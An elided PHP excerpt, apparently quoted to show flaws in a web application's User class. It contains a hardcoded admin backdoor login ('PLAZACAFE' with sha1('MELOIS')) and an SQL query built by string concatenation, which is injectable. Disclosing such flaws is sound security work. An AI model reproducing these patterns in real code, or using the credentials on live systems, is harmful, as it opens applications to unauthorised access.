...
class User {
	...
	function userAuthentication($USERNAME,$h_pass){
		...
		if ($USERNAME=='PLAZACAFE' && $h_pass==sha1('MELOIS')) {
			# code...
			$_SESSION['ADMINID']   		= '1001000110110';
	...
	function applicantAuthentication($USERNAME,$h_pass){
		global $mydb;
		...
		if ($USERNAME=='PLAZACAFE' && $h_pass==sha1('MELOIS')) {
			...
			$mydb->setQuery("SELECT * FROM `tbapplicants` WHERE `USERNAME` = '". $USERNAME ."' and `PASS` = '". $h_pass ."'");
			$cur = $mydb->executeQuery();
			if($cur==false){
				die($cur = $mydb->sqli_error());
			}
